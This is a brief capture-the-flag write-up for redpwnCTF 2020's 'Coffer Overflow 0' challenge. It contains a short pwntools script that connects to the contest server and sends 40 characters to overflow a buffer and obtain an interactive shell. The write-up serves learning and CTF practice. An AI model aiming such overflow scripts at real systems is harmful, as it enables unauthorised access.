# Coffer Overflow 0
Literally just spam characters

```python
from pwn import *

p = remote('2020.redpwnc.tf', 31199)

p.clean(0.2)
p.sendline('a' * 40)
p.interactive()
```